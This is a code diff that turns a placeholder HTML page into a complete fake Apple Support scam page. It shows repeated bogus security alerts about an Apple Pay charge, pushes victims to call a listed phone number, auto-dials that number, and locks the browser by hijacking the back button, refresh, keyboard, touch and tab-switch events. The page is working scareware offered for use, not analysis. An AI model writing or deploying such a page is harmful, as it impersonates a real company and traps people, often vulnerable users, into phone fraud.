@@ -1,12 +1,1272 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>Apple Service Allert</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.tsx"></script>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Apple Support</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        
+        html, body {
+            background-color: #f5f5f7;
+            color: #1d1d1f;
+            line-height: 1.4;
+            padding: 0;
+            margin: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            position: fixed;
+            -webkit-text-size-adjust: none;
+            -ms-text-size-adjust: none;
+            text-size-adjust: none;
+            overscroll-behavior: none;
+        }
+        
+        .container {
+            width: 100%;
+            height: 100vh;
+            height: -webkit-fill-available;
+            display: flex;
+            flex-direction: column;
+            background-color: #fff;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+        
+        /* Apple Logo Header */
+        .header {
+            background-color: #fff;
+            padding: 16px;
+            border-bottom: 1px solid #e5e5e7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            height: 60px;
+        }
+        
+        .apple-logo {
+            font-size: 24px;
+            color: #1d1d1f;
+            font-weight: 400;
+        }
+        
+        .sign-in {
+            position: absolute;
+            right: 16px;
+            color: #0071e3;
+            font-size: 17px;
+            font-weight: 400;
+            cursor: pointer;
+        }
+        
+        /* Device Info Section */
+        .device-info {
+            padding: 16px;
+            border-bottom: 1px solid #e5e5e7;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fbfbfd;
+        }
+        
+        .device-info .device {
+            font-size: 17px;
+            font-weight: 400;
+        }
+        
+        .device-info .change {
+            color: #0071e3;
+            font-size: 17px;
+            font-weight: 400;
+            cursor: pointer;
+        }
+        
+        /* Issue Section */
+        .issue-section {
+            padding: 16px;
+            border-bottom: 1px solid #e5e5e7;
+        }
+        
+        .issue-section h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        /* Search Bar */
+        .search-container {
+            padding: 0 16px 16px;
+            border-bottom: 1px solid #e5e5e7;
+        }
+        
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background-color: #f5f5f7;
+            border-radius: 10px;
+            padding: 12px 16px;
+        }
+        
+        .search-icon {
+            color: #86868b;
+            margin-right: 8px;
+            font-size: 16px;
+        }
+        
+        .search-input {
+            background: transparent;
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 17px;
+        }
+        
+        /* Support Options */
+        .support-options {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 16px;
+            -webkit-overflow-scrolling: touch;
+            overscroll-behavior: contain;
+        }
+        
+        .support-item {
+            display: flex;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid #e5e5e7;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .support-item:active {
+            background-color: #f5f5f7;
+        }
+        
+        .support-item:last-child {
+            border-bottom: none;
+        }
+        
+        .icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+        
+        .repair-icon {
+            background-color: #30d158;
+            color: white;
+        }
+        
+        .performance-icon {
+            background-color: #ff9f0a;
+            color: white;
+        }
+        
+        .subscription-icon {
+            background-color: #5ac8fa;
+            color: white;
+        }
+        
+        .shopping-icon {
+            background-color: #bf5af2;
+            color: white;
+        }
+        
+        .security-icon {
+            background-color: #ff375f;
+            color: white;
+        }
+        
+        .account-icon {
+            background-color: #32d74b;
+            color: white;
+        }
+        
+        .settings-icon {
+            background-color: #0a84ff;
+            color: white;
+        }
+        
+        .support-text {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .support-text .title {
+            font-size: 17px;
+            font-weight: 400;
+        }
+        
+        .support-text .subtitle {
+            font-size: 14px;
+            color: #86868b;
+            margin-top: 2px;
+        }
+        
+        .chevron {
+            color: #c6c6c8;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        
+        /* Bottom Navigation */
+        .bottom-nav {
+            display: flex;
+            border-top: 1px solid #e5e5e7;
+            background-color: #fff;
+            padding-bottom: env(safe-area-inset-bottom);
+            position: sticky;
+            bottom: 0;
+            height: 60px;
+        }
+        
+        .nav-item {
+            flex: 1;
+            padding: 12px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #86868b;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        
+        .nav-item.active {
+            color: #0071e3;
+        }
+        
+        .nav-item:active {
+            color: #0071e3;
+        }
+        
+        .nav-icon {
+            font-size: 22px;
+            margin-bottom: 4px;
+        }
+        
+        /* Notification Stack Container */
+        .notification-stack {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(0, 0, 0, 0.8);
+            pointer-events: auto;
+        }
+        
+        /* Security Notification */
+        .notification-modal {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid #e5e5e7;
+            margin: 10px;
+        }
+        
+        .notification-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #ff3b30;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 20px;
+            color: white;
+        }
+        
+        .notification-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d1d1f;
+        }
+        
+        .notification-message {
+            font-size: 14px;
+            color: #1d1d1f;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        
+        .notification-phone {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0071e3;
+            margin: 8px 0;
+            padding: 8px;
+            background-color: #f5f5f7;
+            border-radius: 8px;
+        }
+        
+        .notification-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            gap: 10px;
+        }
+        
+        .notification-btn {
+            flex: 1;
+            padding: 12px 0;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            -webkit-appearance: none;
+        }
+        
+        .notification-btn.ok {
+            background-color: #0071e3;
+            color: white;
+        }
+        
+        .notification-btn.cancel {
+            background-color: #e5e5e7;
+            color: #1d1d1f;
+        }
+        
+        .notification-btn:active {
+            opacity: 0.9;
+            transform: scale(0.98);
+        }
+        
+        .call-now-banner {
+            background-color: #ff3b30;
+            color: white;
+            padding: 12px;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .call-now-banner:active {
+            opacity: 0.9;
+        }
+        
+        /* Call Blocked Notification */
+        .call-blocked-modal {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid #e5e5e7;
+            margin: 10px;
+        }
+        
+        .call-blocked-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #ff9500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 20px;
+            color: white;
+        }
+        
+        .call-blocked-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d1d1f;
+        }
+        
+        .call-blocked-message {
+            font-size: 14px;
+            color: #1d1d1f;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        
+        .call-blocked-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            gap: 10px;
+        }
+        
+        .call-blocked-btn {
+            flex: 1;
+            padding: 12px 0;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            -webkit-appearance: none;
+        }
+        
+        .call-blocked-btn.ignore {
+            background-color: #e5e5e7;
+            color: #1d1d1f;
+        }
+        
+        .call-blocked-btn.accept {
+            background-color: #0071e3;
+            color: white;
+        }
+        
+        .call-blocked-btn:active {
+            opacity: 0.9;
+            transform: scale(0.98);
+        }
+        
+        /* Passwords & Security Modal */
+        .passwords-modal {
+            background-color: white;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid #e5e5e7;
+            margin: 10px;
+        }
+        
+        .passwords-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #0071e3;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            font-size: 20px;
+            color: white;
+        }
+        
+        .passwords-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1d1d1f;
+        }
+        
+        .passwords-message {
+            font-size: 14px;
+            color: #1d1d1f;
+            margin-bottom: 12px;
+            line-height: 1.5;
+        }
+        
+        .passwords-phone {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0071e3;
+            margin: 8px 0;
+            padding: 8px;
+            background-color: #f5f5f7;
+            border-radius: 8px;
+            cursor: pointer;
+            display: block;
+            text-decoration: none;
+        }
+        
+        .passwords-phone:active {
+            opacity: 0.9;
+        }
+        
+        .passwords-buttons {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 12px;
+        }
+        
+        .passwords-btn {
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+            background-color: #e5e5e7;
+            color: #1d1d1f;
+            -webkit-appearance: none;
+        }
+        
+        .passwords-btn:active {
+            opacity: 0.9;
+            transform: scale(0.98);
+        }
+        
+        /* Animation for notification */
+        @keyframes slideInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .notification-modal, .call-blocked-modal, .passwords-modal {
+            animation: slideInUp 0.3s ease-out forwards;
+        }
+        
+        /* Animation for support items */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .support-item {
+            animation: fadeInUp 0.3s ease-out forwards;
+            opacity: 0;
+        }
+        
+        .support-item:nth-child(1) { animation-delay: 0.05s; }
+        .support-item:nth-child(2) { animation-delay: 0.1s; }
+        .support-item:nth-child(3) { animation-delay: 0.15s; }
+        .support-item:nth-child(4) { animation-delay: 0.2s; }
+        .support-item:nth-child(5) { animation-delay: 0.25s; }
+        .support-item:nth-child(6) { animation-delay: 0.3s; }
+        .support-item:nth-child(7) { animation-delay: 0.35s; }
+        
+        /* Device Selection Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            background-color: white;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+        }
+        
+        .modal-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .close-modal {
+            font-size: 24px;
+            cursor: pointer;
+            color: #86868b;
+        }
+        
+        .device-list {
+            list-style: none;
+        }
+        
+        .device-list-item {
+            padding: 12px 0;
+            border-bottom: 1px solid #e5e5e7;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+        
+        .device-list-item:last-child {
+            border-bottom: none;
+        }
+        
+        .device-icon {
+            margin-right: 12px;
+            font-size: 20px;
+        }
+        
+        /* Full screen overlay */
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .fullscreen-logo {
+            font-size: 60px;
+            margin-bottom: 30px;
+        }
+        
+        .fullscreen-message {
+            font-size: 20px;
+            margin-bottom: 20px;
+            font-weight: 300;
+        }
+        
+        .fullscreen-phone {
+            font-size: 28px;
+            color: #0071e3;
+            font-weight: 600;
+            margin: 20px 0;
+            text-decoration: none;
+        }
+        
+        .freeze-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 9998;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Freeze Overlay -->
+    <div class="freeze-overlay" id="freezeOverlay"></div>
+    
+    <!-- Full Screen Overlay -->
+    <div class="fullscreen-overlay" id="fullscreenOverlay">
+        <div class="fullscreen-logo">
+            <i class="fab fa-apple"></i>
+        </div>
+        <div class="fullscreen-message">Apple Support Security System</div>
+        <div class="fullscreen-message">Please wait while we secure your device...</div>
+        <a href="tel:+1 706-441-5790" class="fullscreen-phone">Calling +1 706-441-5790</a>
+        <div class="fullscreen-message">Your security is our priority</div>
+    </div>
+    
+    <!-- Main Container -->
+    <div class="container" id="mainContainer">
+        <!-- Header -->
+        <div class="header">
+            <div class="apple-logo">
+                <i class="fab fa-apple"></i>
+            </div>
+            <div class="sign-in">Sign in</div>
+        </div>
+        
+        <!-- Device Info -->
+        <div class="device-info">
+            <div class="device">iPhone</div>
+            <div class="change" id="changeDevice">Change &gt;</div>
+        </div>
+        
+        <!-- Issue Section -->
+        <div class="issue-section">
+            <h2>What's going on?</h2>
+        </div>
+        
+        <!-- Search Bar -->
+        <div class="search-container">
+            <div class="search-bar">
+                <div class="search-icon">
+                    <i class="fas fa-search"></i>
+                </div>
+                <input type="text" class="search-input" placeholder="Search for support topics" readonly>
+            </div>
+        </div>
+        
+        <!-- Support Options -->
+        <div class="support-options">
+            <div class="support-item">
+                <div class="icon repair-icon">
+                    <i class="fas fa-tools"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">Repairs & Physical Damage</div>
+                    <div class="subtitle">Screen repair, water damage, etc.</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+            
+            <div class="support-item">
+                <div class="icon performance-icon">
+                    <i class="fas fa-bolt"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">Device Performance</div>
+                    <div class="subtitle">Battery, speed, storage issues</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+            
+            <div class="support-item">
+                <div class="icon subscription-icon">
+                    <i class="fas fa-shopping-bag"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">Subscriptions & Purchases</div>
+                    <div class="subtitle">Billing, refunds, subscriptions</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+            
+            <div class="support-item">
+                <div class="icon shopping-icon">
+                    <i class="fas fa-store"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">Apple Store Shopping</div>
+                    <div class="subtitle">Orders, shipping, returns</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+            
+            <div class="support-item">
+                <div class="icon security-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">Passwords & Security</div>
+                    <div class="subtitle">Apple ID, two-factor authentication</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+            
+            <!-- Additional items -->
+            <div class="support-item">
+                <div class="icon account-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">Account & Profile</div>
+                    <div class="subtitle">Personal information, preferences</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+            
+            <div class="support-item">
+                <div class="icon settings-icon">
+                    <i class="fas fa-cog"></i>
+                </div>
+                <div class="support-text">
+                    <div class="title">System Settings</div>
+                    <div class="subtitle">iOS, macOS, watchOS settings</div>
+                </div>
+                <div class="chevron">&gt;</div>
+            </div>
+        </div>
+        
+        <!-- Bottom Navigation -->
+        <div class="bottom-nav">
+            <div class="nav-item active">
+                <div class="nav-icon">
+                    <i class="fas fa-home"></i>
+                </div>
+                <div>Home</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">
+                    <i class="fas fa-search"></i>
+                </div>
+                <div>Search</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">
+                    <i class="fas fa-phone-alt"></i>
+                </div>
+                <div>Contact</div>
+            </div>
+            <div class="nav-item">
+                <div class="nav-icon">
+                    <i class="fas fa-user"></i>
+                </div>
+                <div>Account</div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Notification Stack Container -->
+    <div class="notification-stack" id="notificationStack">
+        <!-- Notifications will be added here dynamically -->
+    </div>
+    
+    <!-- Device Selection Modal -->
+    <div class="modal" id="deviceModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <div class="modal-title">Select Your Device</div>
+                <div class="close-modal" onclick="closeDeviceModal()">&times;</div>
+            </div>
+            <ul class="device-list">
+                <li class="device-list-item" onclick="selectDevice('iPhone')">
+                    <div class="device-icon"><i class="fas fa-mobile-alt"></i></div>
+                    <div>iPhone</div>
+                </li>
+                <li class="device-list-item" onclick="selectDevice('iPad')">
+                    <div class="device-icon"><i class="fas fa-tablet-alt"></i></div>
+                    <div>iPad</div>
+                </li>
+                <li class="device-list-item" onclick="selectDevice('Mac')">
+                    <div class="device-icon"><i class="fas fa-laptop"></i></div>
+                    <div>Mac</div>
+                </li>
+                <li class="device-list-item" onclick="selectDevice('Apple Watch')">
+                    <div class="device-icon"><i class="fas fa-clock"></i></div>
+                    <div>Apple Watch</div>
+                </li>
+                <li class="device-list-item" onclick="selectDevice('AirPods')">
+                    <div class="device-icon"><i class="fas fa-headphones"></i></div>
+                    <div>AirPods</div>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        let autoCycle = true;
+        let cycleInterval;
+        let notificationIdCounter = 0;
+        let isFullScreen = false;
+        let backButtonBlocked = false;
+        
+        // Prevent all context menus
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Prevent text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Disable all keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            // Block F5, Ctrl+R, Ctrl+Shift+R, Ctrl+W, Alt+Left, Backspace
+            if (e.key === 'F5' || 
+                (e.ctrlKey && e.key === 'r') || 
+                (e.ctrlKey && e.shiftKey && e.key === 'r') ||
+                (e.ctrlKey && e.key === 'w') ||
+                (e.altKey && e.key === 'ArrowLeft') ||
+                e.key === 'Backspace') {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+        
+        // Request fullscreen on page load
+        function requestFullScreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.log('Fullscreen request failed:', err);
+                });
+            } else if (elem.mozRequestFullScreen) { /* Firefox */
+                elem.mozRequestFullScreen();
+            } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { /* IE/Edge */
+                elem.msRequestFullscreen();
+            }
+            isFullScreen = true;
+        }
+        
+        // Force fullscreen
+        function forceFullScreen() {
+            document.getElementById('mainContainer').style.display = 'none';
+            document.getElementById('fullscreenOverlay').style.display = 'flex';
+            document.getElementById('freezeOverlay').style.display = 'block';
+            isFullScreen = true;
+            
+            // Auto dial after 2 seconds
+            setTimeout(function() {
+                window.location.href = 'tel:+1 706-441-5790';
+            }, 2000);
+        }
+        
+        // Block back button
+        function blockBackButton() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+                forceFullScreen();
+            };
+            backButtonBlocked = true;
+        }
+        
+        // Start the automated cycle when page loads
+        window.onload = function() {
+            // Force fullscreen immediately
+            requestFullScreen();
+            
+            // Block back button
+            blockBackButton();
+            
+            // Create first notification after a short delay
+            setTimeout(function() {
+                createSecurityAlert();
+            }, 1000);
+            
+            // Start auto cycle
+            startAutoCycle();
+            
+            // Add click handlers to prevent default behaviors
+            document.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('call-now-banner') && 
+                    !e.target.classList.contains('passwords-phone') &&
+                    !e.target.classList.contains('notification-btn') &&
+                    !e.target.classList.contains('call-blocked-btn') &&
+                    !e.target.classList.contains('passwords-btn')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                }
+            }, true);
+            
+            // Prevent any links from working normally
+            document.querySelectorAll('a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    if (!this.href.includes('tel:')) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        forceFullScreen();
+                    }
+                });
+            });
+        };
+        
+        // Start the automated notification cycle
+        function startAutoCycle() {
+            // Create new notifications every 3 seconds
+            cycleInterval = setInterval(function() {
+                if (autoCycle) {
+                    if (Math.random() > 0.5) {
+                        createSecurityAlert();
+                    } else {
+                        createCallBlocked();
+                    }
+                }
+            }, 3000);
+        }
+        
+        // Create security alert (first notification)
+        function createSecurityAlert() {
+            notificationIdCounter++;
+            const notificationId = 'notification-' + notificationIdCounter;
+            
+            const securityAlert = document.createElement('div');
+            securityAlert.className = 'notification-modal';
+            securityAlert.id = notificationId;
+            securityAlert.innerHTML = `
+                <div class="notification-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="notification-title">Security Alert</div>
+                <div class="notification-message">
+                    Your Apple ID was recently used at APPLE STORE for $299.78 Via Apple Pay Pre-Authorization! We have placed those request on hold to ensure safest and Security. Not you?
+                </div>
+                <div class="call-now-banner" onclick="handleCallNow('${notificationId}')">Call Now</div>
+                <div class="notification-phone">+1 706-441-5790</div>
+                <div class="notification-message">
+                    Immediately call Apple Support to Freeze it!
+                </div>
+                <div class="notification-buttons">
+                    <button class="notification-btn ok" onclick="removeNotification('${notificationId}')">OK</button>
+                    <button class="notification-btn cancel" onclick="removeNotification('${notificationId}')">Cancel</button>
+                </div>
+            `;
+            
+            document.getElementById('notificationStack').appendChild(securityAlert);
+            
+            // Automatically create next notification types after a delay
+            setTimeout(() => {
+                if (autoCycle) {
+                    createCallBlocked();
+                }
+            }, 1500);
+            
+            setTimeout(() => {
+                if (autoCycle) {
+                    createPasswordsModal();
+                }
+            }, 3000);
+            
+            // Force fullscreen if user tries to interact
+            securityAlert.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('call-now-banner') && 
+                    !e.target.classList.contains('notification-btn')) {
+                    forceFullScreen();
+                }
+            });
+        }
+        
+        // Create call blocked notification
+        function createCallBlocked() {
+            notificationIdCounter++;
+            const notificationId = 'callblocked-' + notificationIdCounter;
+            
+            const callBlocked = document.createElement('div');
+            callBlocked.className = 'call-blocked-modal';
+            callBlocked.id = notificationId;
+            callBlocked.innerHTML = `
+                <div class="call-blocked-icon">
+                    <i class="fas fa-phone-slash"></i>
+                </div>
+                <div class="call-blocked-title">Call Blocked</div>
+                <div class="call-blocked-message">
+                    This website has been blocked from automatically starting a call.
+                </div>
+                <div class="call-blocked-buttons">
+                    <button class="call-blocked-btn ignore" onclick="removeNotification('${notificationId}')">Ignore</button>
+                    <button class="call-blocked-btn accept" onclick="forceFullScreen()">Accept</button>
+                </div>
+            `;
+            
+            document.getElementById('notificationStack').appendChild(callBlocked);
+            
+            // Force fullscreen if user tries to interact
+            callBlocked.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('call-blocked-btn')) {
+                    forceFullScreen();
+                }
+            });
+        }
+        
+        // Create passwords & security modal
+        function createPasswordsModal() {
+            notificationIdCounter++;
+            const notificationId = 'passwords-' + notificationIdCounter;
+            
+            const passwordsModal = document.createElement('div');
+            passwordsModal.className = 'passwords-modal';
+            passwordsModal.id = notificationId;
+            passwordsModal.innerHTML = `
+                <div class="passwords-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <div class="passwords-title">Passwords & Security</div>
+                <div class="passwords-message">
+                    For assistance with passwords and security issues, please contact Apple Support.
+                </div>
+                <a href="tel:+1 706-441-5790" class="passwords-phone">Call +1 706-441-5790</a>
+                <div class="passwords-buttons">
+                    <button class="passwords-btn" onclick="removeNotification('${notificationId}')">Cancel</button>
+                </div>
+            `;
+            
+            document.getElementById('notificationStack').appendChild(passwordsModal);
+            
+            // Force fullscreen if user tries to interact
+            passwordsModal.addEventListener('click', function(e) {
+                if (!e.target.classList.contains('passwords-phone') && 
+                    !e.target.classList.contains('passwords-btn')) {
+                    forceFullScreen();
+                }
+            });
+        }
+        
+        // Handle manual call now click
+        function handleCallNow(notificationId) {
+            // Clear all notifications
+            document.getElementById('notificationStack').innerHTML = '';
+            
+            // Stop auto cycle
+            autoCycle = false;
+            clearInterval(cycleInterval);
+            
+            // Force fullscreen
+            forceFullScreen();
+        }
+        
+        // Remove individual notification
+        function removeNotification(notificationId) {
+            const notification = document.getElementById(notificationId);
+            if (notification) {
+                notification.remove();
+                // Create new notification after removing
+                setTimeout(() => {
+                    if (autoCycle) {
+                        createSecurityAlert();
+                    }
+                }, 1000);
+            }
+        }
+        
+        // Device selection functionality
+        document.getElementById('changeDevice').addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            forceFullScreen();
+        });
+        
+        function closeDeviceModal() {
+            document.getElementById('deviceModal').style.display = 'none';
+        }
+        
+        function selectDevice(deviceName) {
+            document.querySelector('.device-info .device').textContent = deviceName;
+            closeDeviceModal();
+        }
+        
+        // Close modals if clicked outside content
+        window.addEventListener('click', function(event) {
+            const deviceModal = document.getElementById('deviceModal');
+            
+            if (event.target === deviceModal) {
+                forceFullScreen();
+            }
+        });
+        
+        // Bottom navigation functionality - modified to force fullscreen
+        const navItems = document.querySelectorAll('.nav-item');
+        navItems.forEach(item => {
+            item.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                forceFullScreen();
+            });
+        });
+        
+        // Support items also force fullscreen
+        const supportItems = document.querySelectorAll('.support-item');
+        supportItems.forEach(item => {
+            item.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                forceFullScreen();
+            });
+        });
+        
+        // Prevent zoom on double tap
+        document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+                forceFullScreen();
+            }
+        });
+        
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+                forceFullScreen();
+            }
+            lastTouchEnd = now;
+        }, false);
+        
+        // Prevent any dragging
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        // Block right click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            forceFullScreen();
+            return false;
+        });
+        
+        // Block refresh
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
+                e.preventDefault();
+                forceFullScreen();
+            }
+        });
+        
+        // Handle visibility change - if user switches tabs, force fullscreen when they return
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                setTimeout(function() {
+                    forceFullScreen();
+                }, 500);
+            }
+        });
+        
+        // Handle page becoming visible again
+        document.addEventListener('focus', function() {
+            setTimeout(function() {
+                forceFullScreen();
+            }, 500);
+        });
+        
+        // Handle beforeunload - try to keep user on page
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '';
+            forceFullScreen();
+        });
+        
+        // Periodically check and force fullscreen
+        setInterval(function() {
+            if (!isFullScreen) {
+                forceFullScreen();
+            }
+        }, 2000);
+        
+        // Block all iframes
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
+    </script>
+</body>
 </html>
